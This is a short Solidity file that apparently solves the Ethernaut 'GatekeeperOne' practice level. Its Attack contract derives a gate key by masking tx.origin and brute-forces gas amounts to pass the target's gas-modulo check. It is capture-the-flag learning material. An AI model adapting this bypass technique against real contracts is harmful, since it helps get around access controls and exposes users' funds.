// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "./Level13.sol";

contract Attack {
    function attackGatekeeperOne(GatekeeperOne _instance, uint256 _gas) public payable returns (uint256) {
        bytes8 txBytes = bytes8(uint64(uint160(tx.origin)));
        bytes8 filter = 0xFFFFFFFF0000FFFF;
        bytes8 gateKey = txBytes & filter;
        if (_gas > 0) {
            _instance.enter{gas: 8191 * 4 + _gas}(gateKey);
            return 0;
        }
        for (uint256 i; i < 8191; i++) {
            (bool success,) =
                address(_instance).call{gas: 3 * 8191 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                return i;
            }
        }
        return 0;
    }
}
